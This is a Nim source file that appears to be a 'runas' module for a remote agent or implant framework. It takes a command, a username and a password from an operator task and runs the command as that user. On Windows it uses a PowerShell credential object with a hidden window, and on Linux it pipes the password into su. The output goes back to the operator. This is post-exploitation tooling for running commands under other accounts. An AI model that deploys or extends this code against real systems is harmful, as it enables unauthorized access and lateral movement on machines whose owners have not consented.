import std/[json, osproc, os, strutils]
import core/types
import commands/registry

proc runasExecute(taskId: string, params: JsonNode, state: AgentState,
                  send: SendMsg): TaskResult =
  let command  = params{"command"}.getStr("")
  let user     = params{"user"}.getStr("")
  let password = params{"password"}.getStr("")

  if command.len == 0:
    return TaskResult(output: "Error: command is required", status: "error", completed: true)
  if user.len == 0:
    return TaskResult(output: "Error: user is required", status: "error", completed: true)

  try:
    when defined(windows):
      # Use PowerShell with PSCredential to run the command and capture output
      let domain = params{"domain"}.getStr(".")
      let fullUser = domain & "\\" & user
      let psScript =
        "$pw = ConvertTo-SecureString " & quoteShell(password) & " -AsPlainText -Force; " &
        "$cred = New-Object System.Management.Automation.PSCredential(" & quoteShell(fullUser) & ", $pw); " &
        "$tmp = [System.IO.Path]::GetTempFileName(); " &
        "Start-Process cmd.exe -ArgumentList '/c " & command.replace("'", "''") & " > ' + $tmp + ' 2>&1' " &
        "-Credential $cred -Wait -WindowStyle Hidden; " &
        "Get-Content $tmp; Remove-Item $tmp"
      let (output, code) = execCmdEx(
        "powershell -NoProfile -NonInteractive -Command " & quoteShell(psScript),
        options = {poStdErrToStdOut}, workingDir = state.cwd)
      let status = if code == 0: "success" else: "error"
      return TaskResult(output: output, status: status, completed: true)
    else:
      # Linux: use su -c
      var cmd: string
      if password.len > 0:
        cmd = "echo " & quoteShell(password) & " | su " & quoteShell(user) &
              " -c " & quoteShell(command)
      else:
        cmd = "su " & quoteShell(user) & " -c " & quoteShell(command)
      let (output, code) = execCmdEx(cmd, options = {poStdErrToStdOut},
                                     workingDir = state.cwd)
      let status = if code == 0: "success" else: "error"
      return TaskResult(output: output, status: status, completed: true)
  except Exception as e:
    return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)

proc initRunas*() =
  register("runas", runasExecute)
